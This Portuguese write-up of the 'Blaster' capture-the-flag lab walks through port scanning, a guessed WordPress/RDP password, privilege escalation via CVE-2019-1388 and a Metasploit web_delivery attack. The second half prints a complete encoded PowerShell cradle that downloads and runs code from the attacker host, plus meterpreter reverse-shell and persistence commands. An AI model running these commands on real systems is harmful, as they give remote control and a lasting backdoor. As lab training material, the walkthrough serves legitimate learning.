ROOM BLASTER

Portas:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
3389/tcp open  ms-wbt-server Microsoft Terminal Services

80/tcp   open  http          syn-ack ttl 127
135/tcp  open  msrpc         syn-ack ttl 127
139/tcp  open  netbios-ssn   syn-ack ttl 127
445/tcp  open  microsoft-ds  syn-ack ttl 127
3306/tcp open  mysql         syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127

Identificado um servidor web rodando um Microsoft IIS Windows Server.

Identificado um diretório escondido (/retro), através do comando (dirb http://10.10.217.2 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
http://10.10.217.2/retro/

usuário: wade
Senha: parzival

Encontrado página de login do Wordpress: http://10.10.217.2/retro/wp-login.php

Lendo as informações da url (http://10.10.217.2/retro/), há uma postagem que faz referência ao personagem "wade" do Livro e filme Jogador Numero 1, então pesquisando na internet não foi dificil identificar que a senha é o nome de seu avatar (parzival).

"Ready Player One
by Wade

I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie!"

Tentei logar via rdesktop, mas há falha no CreedSSP, então tive que logar com o XfreeRDP.
xfreerdp /u:wade /p:parzival /v:10.10.217.2
https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown

Não encontrado nada no histórico do navegador do usuário no Internet Explorer.

Dentro da lixeira do Winodows, encontrado a aplicação "hhupd.exe".
Pesquisado essa aplicação e ela tem um CVE publicado para ele (CVE-2019-1388).
Esse arquivo executável (hhupd.exe), é usado para escalãção de privilégios no Windows.

Procedimento de escalação de privilégios efetuado conforme a documentação da URL (https://github.com/jas502n/CVE-2019-1388)
O mesmo procedimento de escalação de privilégios está no vídeo (https://www.youtube.com/watch?v=3BQKpPNlTSo).

Agora temos um shell de adminsitrador (nt authority/system) e capturamos a flag na área de trabalho do administrador.

Também usamos o mesmo usuário e senha (wade/parzival) para autenticar como usuário administrador do Wordpress, o que poderiamos usar para escalar privilégios.

O próximo passo é fazer a mesma exploração, mas de outro modo de ter acesso ao shell do alvo, mas de forma remota e persiste, o procedimento é feito via metasploit-framework.

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


Executamos esse exploit no alvo através do terminal em modo privilegiado, gerou um powershell para executar no alvo.
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABiAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABiAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADEAOAA1AC4AMQAwADQAOgA4ADAAOAAwAC8AYQBhADgAZQBYAEUASQAvAEcAegBrAFkARABrAFkANQBnAFcAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADkALgAxADgANQAuADEAMAA0ADoAOAAwADgAMAAvAGEAYQA4AGUAWABFAEkAJwApACkAOwA=

Hospedado em PSH.txt e gerado um webserver para enviar para o alvo (python -m SimpleHTTPServer 80).

Baixado no alvo o arquivos e executado no powershell do alvo os comandos acima e entregou o payload criando um shell reverso meterpreter entre do alvo para o atacante.

Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  10.9.185.104:4444 -> 10.10.241.231:49842 (10.10.241.231)

Para gerar a persistência da conexão, use o comando (run persistence -X), esse comando serve para caso o alvo reinicie ou seja desligado, ao retornar ele se conecte automaticamente ao atacante, mas para funcionar tem de criar um handler para aguardar a conexão.
O handler precisar estar configurado com o mesmo ip e porta que foi criado a persistência.

meterpreter > run persistence -X
use exploit/multi/handler


Finalizado!











